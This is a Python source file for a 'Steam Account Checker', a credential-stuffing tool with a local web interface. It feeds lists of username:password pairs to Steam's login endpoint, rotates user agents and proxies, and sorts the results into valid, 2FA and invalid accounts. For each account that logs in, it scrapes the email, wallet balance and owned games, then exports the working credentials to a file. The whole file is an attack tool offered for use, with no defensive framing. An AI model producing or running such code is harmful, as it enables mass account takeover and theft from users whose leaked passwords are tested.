#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import time
import random
import base64
import threading
from datetime import datetime
import os
import sys

# Simple HTTP server
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from urllib.parse import parse_qs, urlparse
except ImportError:
    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
    from urlparse import parse_qs, urlparse

class SteamChecker:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.status = {
            "active": False,
            "total": 0,
            "checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 0
        }
        self.proxy_list = []
        self.current_proxy = 0
        self.captcha_count = 0
    
    def get_user_agent(self):
        """Wide range of user agents"""
        agents = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]
        return random.choice(agents)
    
    def get_proxy(self):
        """Rotate through proxy list"""
        if self.proxy_list:
            proxy = self.proxy_list[self.current_proxy % len(self.proxy_list)]
            self.current_proxy += 1
            return {"http": proxy, "https": proxy}
        return None
    
    def rsa_encrypt(self, password, mod_hex, exp_hex):
        """RSA encryption with PKCS#1 v1.5 padding"""
        try:
            # Convert hex to integer
            mod = int(mod_hex, 16)
            exp = int(exp_hex, 16)
            
            # Convert password to bytes
            password_bytes = password.encode('utf-8')
            
            # Calculate key length
            key_length = (mod.bit_length() + 7) // 8
            
            # PKCS#1 v1.5 padding
            # Format: 0x00 0x02 [random non-zero bytes] 0x00 [data]
            
            # Calculate padding length
            padding_length = key_length - len(password_bytes) - 3
            
            if padding_length < 8:
                # Fallback - simple padding
                padded_data = password_bytes.ljust(key_length - 3, b'\x01')
                padded = b'\x00\x02' + padded_data + b'\x00'
            else:
                # Proper PKCS#1 padding
                import os
                random_bytes = os.urandom(padding_length)
                # Ensure non-zero bytes
                random_bytes = bytes(b if b != 0 else 1 for b in random_bytes)
                
                padded = b'\x00\x02' + random_bytes + b'\x00' + password_bytes
            
            # Convert to integer
            padded_int = int.from_bytes(padded, 'big')
            
            # RSA encryption
            encrypted_int = pow(padded_int, exp, mod)
            
            # Convert to bytes
            encrypted_bytes = encrypted_int.to_bytes(key_length, 'big')
            
            # Base64 encode
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
            
            return encrypted_b64
            
        except Exception as e:
            print(f"RSA Encryption Error: {e}")
            # Fallback - simple encryption
            try:
                mod = int(mod_hex, 16)
                exp = int(exp_hex, 16)
                pwd_int = int.from_bytes(password.encode('utf-8'), 'big')
                encrypted_int = pow(pwd_int, exp, mod)
                encrypted_bytes = encrypted_int.to_bytes((mod.bit_length() + 7) // 8, 'big')
                return base64.b64encode(encrypted_bytes).decode('utf-8')
            except:
                return None
    
    def get_rsa_key(self):
        """Get Steam RSA key"""
        try:
            response = self.session.post(
                'https://steamcommunity.com/login/getrsakey/',
                data={'username': 'test'},
                headers={'User-Agent': self.get_user_agent()},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return data
            
            return None
        except:
            return None
    
    def check_login(self, username, password):
        """Check Steam login credentials"""
        for attempt in range(3):
            try:
                print(f"Checking: {username} (Attempt {attempt+1})")
                
                rsa_data = self.get_rsa_key()
                if not rsa_data:
                    return {'status': 'error', 'msg': 'RSA key error'}
                
                encrypted_password = self.rsa_encrypt(password, rsa_data['publickey_mod'], rsa_data['publickey_exp'])
                if not encrypted_password:
                    return {'status': 'error', 'msg': 'Encryption failed'}
                
                print(f"RSA Mod: {rsa_data['publickey_mod'][:20]}...")
                print(f"RSA Exp: {rsa_data['publickey_exp']}")
                
                response = self.session.post(
                    'https://steamcommunity.com/login/dologin/',
                    data={
                        'username': username,
                        'password': encrypted_password,
                        'rsatimestamp': rsa_data['timestamp'],
                        'remember_login': 'false',
                        'oauth_client_id': '',
                        'oauth_scope': ''
                    },
                    headers={'User-Agent': self.get_user_agent()},
                    timeout=10,
                    allow_redirects=False
                )
                
                response_text = response.text
                print(f"Response status: {response.status_code}")
                print(f"Response preview: {response_text[:200]}")
                
                # Check for successful login indicators
                if 'success' in response_text.lower() and 'true' in response_text.lower():
                    account_info = self.get_account_info()
                    return {
                        'status': 'valid',
                        'msg': 'Successful Login',
                        'info': account_info
                    }
                
                # Check for 2FA
                if any(twofa_key in response_text.lower() for twofa_key in ["steamguard", "two-factor", "requires_activation"]):
                    return {'status': 'valid_2fa', 'msg': 'Valid Account (2FA Enabled)', 'info': {}}
                
                # Check for invalid credentials
                if any(fail_key in response_text for fail_key in [
                    "The account name or password that you have entered is incorrect",
                    "Incorrect account name or password",
                    "Your account credentials do not match",
                    "invalid_password"
                ]):
                    return {'status': 'invalid', 'msg': 'Invalid Username/Password'}
                
                # Check status codes
                if response.status_code == 429:
                    return {'status': 'rate_limited', 'msg': 'Rate Limited'}
                
                if response.status_code == 403:
                    return {'status': 'invalid', 'msg': 'Invalid Username/Password'}
                
                if response.status_code == 200:
                    # Might be valid if we got a 200 response with session data
                    if 'sessionid' in str(response.cookies):
                        account_info = self.get_account_info()
                        return {
                            'status': 'valid',
                            'msg': 'Successful Login',
                            'info': account_info
                        }
                    # Otherwise invalid
                    return {'status': 'invalid', 'msg': 'Invalid Username/Password'}
                
                if response.status_code in [301, 302, 307, 308]:
                    # Redirect might indicate valid login
                    account_info = self.get_account_info()
                    return {
                        'status': 'valid',
                        'msg': 'Successful Login',
                        'info': account_info
                    }
                
                return {'status': 'unknown', 'msg': f'Unknown response ({response.status_code})'}
                
            except requests.exceptions.Timeout:
                if attempt == 2:
                    return {'status': 'error', 'msg': 'Timeout'}
                time.sleep(2)
            except Exception as e:
                print(f"Exception: {e}")
                if attempt == 2:
                    return {'status': 'error', 'msg': str(e)}
                time.sleep(2)
        
        return {'status': 'error', 'msg': 'Max retries exceeded'}
    
    def get_account_info(self, username=None):
        """Get account information"""
        try:
            response = self.session.get(
                'https://steamcommunity.com/my/profile',
                headers={'User-Agent': self.get_user_agent()},
                timeout=10
            )
            
            if response.status_code == 200:
                html = response.text
                
                # Extract email
                email_match = re.search(r'<span>(\S+@\S+\.\S+)</span>', html)
                email = email_match.group(1) if email_match else 'N/A'
                
                # Extract country
                country_match = re.search(r'<div>Country</div>.*?<div>([^<]+)</div>', html)
                country = country_match.group(1) if country_match else 'N/A'
                
                # Extract balance
                balance_match = re.search(r'\$([0-9.]+)', html)
                balance = balance_match.group(1) if balance_match else '0.00'
                
                games = self.get_owned_games()
                
                return {
                    'email': email,
                    'country': country,
                    'balance': balance,
                    'Games': games
                }
        except:
            pass
        
        return {'email': 'N/A', 'country': 'N/A', 'balance': '0.00', 'Games': []}
    
    def get_owned_games(self):
        """Get owned games list"""
        try:
            response = self.session.get(
                'https://steamcommunity.com/my/games/',
                headers={'User-Agent': self.get_user_agent()},
                timeout=10
            )
            
            if response.status_code == 200:
                html = response.text
                games = []
                
                # Extract game names from various patterns
                pattern1 = re.findall(r'"name":"([^"]{3,100})"', html)
                if pattern1:
                    games.extend(pattern1)
                
                pattern2 = re.findall(r'gameName">([^<]{3,100})</span>', html)
                if pattern2:
                    games.extend(pattern2)
                
                pattern3 = re.findall(r'<span class="title">([^<]{3,100})</span>', html)
                if pattern3:
                    games.extend(pattern3)
                
                # Remove duplicates and clean
                games = list(dict.fromkeys(games))
                games = [g.strip() for g in games if g.strip() and len(g.strip()) > 2 and 'http' not in g.lower()]
                
                return games[:20]
        except Exception as e:
            print(f"Game fetch error: {e}")
        
        return []
    
    def run_check(self, credentials_list):
        """Main checking function"""
        self.status["active"] = True
        self.status["total"] = len(credentials_list)
        self.status["checked"] = 0
        self.status["valid"] = 0
        self.status["invalid"] = 0
        self.status["errors"] = 0
        
        self.results = []
        
        print(f"{len(credentials_list)} accounts will be checked...")
        
        for idx, line in enumerate(credentials_list):
            if not self.status["active"]:
                break
            
            line = line.strip()
            if not line or ':' not in line:
                continue
            
            parts = line.split(':')
            username = parts[0].strip()
            password = ':'.join(parts[1:]).strip()
            
            result = self.check_login(username, password)
            
            self.status["checked"] += 1
            
            if result['status'] == 'valid':
                self.status["valid"] += 1
                info = result.get('info', {})
                games = info.get('Games', [])
                games_str = ', '.join(games) if games else 'None'
                
                result_entry = {
                    'username': username,
                    'status': 'valid',
                    'message': f'Valid - Games: {len(games)} | Balance: {info.get("balance", "0.00")}',
                    'credential': f'{username}:{password} [{games_str}]',
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'full_info': info
                }
                print(f"  Valid Account: {username}:{password}")
                print(f"  Games: {len(info.get('Games', []))} total")
                
            elif result['status'] == 'valid_2fa':
                self.status["valid"] += 1
                result_entry = {
                    'username': username,
                    'status': 'valid_2fa',
                    'message': 'Valid (2FA Enabled)',
                    'credential': f'{username}:{password}',
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'full_info': {}
                }
                print(f"  Valid 2FA: {username}:{password}")
                
            else:
                self.status["invalid"] += 1
                result_entry = {
                    'username': username,
                    'status': 'invalid',
                    'message': result.get('msg', 'Invalid'),
                    'credential': f'{username}:{password}',
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'full_info': {}
                }
            
            # Check for captcha
            if result.get('msg') and 'captcha' in result['msg'].lower():
                print("Captcha detected! Process stopped.")
                self.status["active"] = False
                break
            
            self.results.append(result_entry)
            time.sleep(random.uniform(1, 3))
        
        print(f"Check completed!")
        self.status["active"] = False
    
    def export_valid_accounts(self):
        """Export valid accounts to file"""
        valid_accounts = [r for r in self.results if r['status'] in ['valid', 'valid_2fa']]
        
        with open('valid_accounts.txt', 'w', encoding='utf-8') as f:
            for acc in valid_accounts:
                f.write(f"{acc['credential']}\n")
        
        return valid_accounts

checker = None

def main():
    global checker
    checker = SteamChecker()
    
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.send_html()
            elif self.path == '/status':
                self.send_json(checker.status)
            elif self.path == '/results':
                self.send_json(checker.results)
        
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            if self.path == '/start':
                try:
                    data = json.loads(body.decode('utf-8'))
                    credentials = data.get('credentials', '').strip().split('\n')
                    
                    if credentials and checker.status["active"] == False:
                        thread = threading.Thread(target=checker.run_check, args=(credentials,))
                        thread.daemon = True
                        thread.start()
                        self.send_json({'success': True, 'message': f'{len(credentials)} accounts started'})
                    else:
                        self.send_json({'success': False, 'message': 'Already running'})
                except:
                    self.send_json({'success': False, 'message': 'Invalid input'})
            
            elif self.path == '/stop':
                checker.status["active"] = False
                self.send_json({'success': True, 'message': 'Stopped'})
            
            elif self.path == '/export':
                valid_accounts = [r for r in checker.results if r['status'] in ['valid', 'valid_2fa']]
                export_text = '\n'.join([r['credential'] for r in valid_accounts]) if valid_accounts else 'No valid accounts'
                export_bytes = export_text.encode('utf-8')
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.send_header('Content-Disposition', 'attachment; filename="valid_accounts.txt"')
                self.send_header('Content-Length', str(len(export_bytes)))
                self.end_headers()
                self.wfile.write(export_bytes)
        
        def send_html(self):
            html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Steam Account Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #f5f5f5; color: #333; padding: 20px; }
        .container { max-width: 700px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; padding: 30px 20px; background: #ffffff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .header h1 { color: #1a1a1a; font-size: 32px; margin-bottom: 8px; font-weight: 700; }
        .card { background: #ffffff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 8px; color: #1a1a1a; font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
        textarea { width: 100%; padding: 12px; background: #fafafa; color: #333; border: 1px solid #ddd; border-radius: 4px; height: 150px; font-family: 'Courier New', monospace; resize: vertical; font-size: 13px; }
        textarea:focus { outline: none; border-color: #1abc9c; box-shadow: 0 0 0 3px rgba(26, 188, 156, 0.1); }
        .button-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .btn { cursor: pointer; font-weight: 600; padding: 12px; border: none; border-radius: 4px; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; transition: all 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .btn-primary { background: #1abc9c; color: #ffffff; grid-column: 1 / 3; }
        .btn-primary:hover { background: #16a085; }
        .btn-danger { background: #e74c3c; color: #ffffff; grid-column: 1 / 3; display: none; }
        .btn-danger:hover { background: #c0392b; }
        .btn-secondary { background: #ecf0f1; color: #333; border: 1px solid #ddd; }
        .btn-secondary:hover { background: #bdc3c7; }
        .stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 15px; }
        .stat-box { background: #f9f9f9; padding: 15px; text-align: center; border-radius: 4px; border: 1px solid #e0e0e0; }
        .stat-box h3 { font-size: 28px; color: #1abc9c; margin-bottom: 5px; font-weight: 700; }
        .stat-box small { color: #999; text-transform: uppercase; font-size: 11px; font-weight: 600; letter-spacing: 0.5px; }
        .results { max-height: 350px; overflow-y: auto; background: #fafafa; border-radius: 4px; padding: 12px; border: 1px solid #e0e0e0; margin-top: 15px; }
        .results::-webkit-scrollbar { width: 6px; }
        .results::-webkit-scrollbar-track { background: #f0f0f0; }
        .results::-webkit-scrollbar-thumb { background: #1abc9c; border-radius: 3px; }
        .result-item { padding: 10px; margin: 6px 0; border-radius: 4px; font-size: 12px; border-left: 3px solid #ddd; background: #fff; font-family: 'Courier New', monospace; word-break: break-all; line-height: 1.5; }
        .result-valid { background: #e8f8f5; border-left-color: #1abc9c; color: #0d5d4f; }
        .result-invalid { background: #fadbd8; border-left-color: #e74c3c; color: #6c2c2c; }
        .card-title { color: #1a1a1a; font-size: 13px; margin-bottom: 15px; text-transform: uppercase; border-bottom: 2px solid #1abc9c; padding-bottom: 10px; font-weight: 600; letter-spacing: 0.5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>Steam<span style="color: #1abc9c;">Family</span></h1><p class="subtitle">Account Checker Tool</p></div>
        <div class="card">
            <div class="input-group">
                <label>ACCOUNTS (username:password)</label>
                <textarea id="credentials" placeholder="user1:pass1&#10;user2:pass2"></textarea>
            </div>
            <div class="button-group">
                <button id="startBtn" class="btn btn-primary" onclick="startCheck()">START</button>
                <button id="stopBtn" class="btn btn-danger" onclick="stopCheck()">STOP</button>
                <button class="btn btn-secondary" onclick="document.getElementById('fileInput').click()">IMPORT</button>
                <button class="btn btn-secondary" onclick="exportResults()">EXPORT</button>
            </div>
            <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="handleFileUpload(event)">
        </div>
        <div class="card">
            <div class="card-title">STATISTICS</div>
            <div class="stats">
                <div class="stat-box"><h3 id="totalCount">0</h3><small>Total</small></div>
                <div class="stat-box"><h3 id="checkedCount">0</h3><small>Checked</small></div>
                <div class="stat-box"><h3 id="validCount">0</h3><small>Valid</small></div>
                <div class="stat-box"><h3 id="invalidCount">0</h3><small>Invalid</small></div>
            </div>
        </div>
        <div class="card">
            <div class="card-title">RESULTS</div>
            <div class="results" id="results"><div style="text-align: center; color: #666; padding: 20px;">No results yet...</div></div>
        </div>
    </div>
    <script>
        let updateInterval;
        function startCheck() {
            const credentials = document.getElementById('credentials').value.trim();
            if (!credentials) { alert('Please enter account list'); return; }
            fetch('/start', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credentials: credentials})})
            .then(r => r.json()).then(d => {
                if (d.success) {
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('stopBtn').style.display = 'block';
                    updateInterval = setInterval(updateStats, 1000);
                    updateStats();
                } else alert('Error: ' + d.message);
            }).catch(e => alert('Request failed'));
        }
        function stopCheck() {
            fetch('/stop', {method: 'POST'}).then(r => r.json()).then(d => {
                document.getElementById('startBtn').style.display = 'block';
                document.getElementById('stopBtn').style.display = 'none';
                clearInterval(updateInterval);
            });
        }
        function handleFileUpload(event) {
            const file = event.target.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = e => document.getElementById('credentials').value = e.target.result;
            reader.readAsText(file);
        }
        function exportResults() {
            fetch('/export')
            .then(response => response.blob())
            .then(blob => {
                const url = window.URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'valid_accounts.txt';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                window.URL.revokeObjectURL(url);
                alert('Exported successfully!');
            })
            .catch(error => alert('Export failed: ' + error));
        }
        function updateStats() {
            fetch('/status').then(r => r.json()).then(s => {
                document.getElementById('totalCount').textContent = s.total;
                document.getElementById('checkedCount').textContent = s.checked;
                document.getElementById('validCount').textContent = s.valid;
                document.getElementById('invalidCount').textContent = s.invalid;
                if (!s.active && s.total > 0) {
                    document.getElementById('startBtn').style.display = 'block';
                    document.getElementById('stopBtn').style.display = 'none';
                    clearInterval(updateInterval);
                }
            });
            fetch('/results').then(r => r.json()).then(results => {
                const div = document.getElementById('results');
                if (results.length === 0) return;
                div.innerHTML = results.map(r => {
                    const cls = (r.status === 'valid' || r.status === 'valid_2fa') ? 'result-valid' : 'result-invalid';
                    const cred = r.credential.split('[')[0].trim();
                    return '<div class="result-item ' + cls + '"><strong>' + cred + '</strong><br/><small>' + r.message + ' @ ' + r.time + '</small></div>';
                }).join('');
                div.scrollTop = div.scrollHeight;
            });
        }
    </script>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        
        def send_json(self, data):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(data).encode('utf-8'))
        
        def log_message(self, format, *args):
            pass
    
    try:
        port = 8080
        server = HTTPServer(('0.0.0.0', port), Handler)
        print(f"Web interface started: http://localhost:{port}")
        print("Open in your browser")
        print("=" * 60)
        
        server.serve_forever()
        
    except KeyboardInterrupt:
        print("\nApplication closed")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
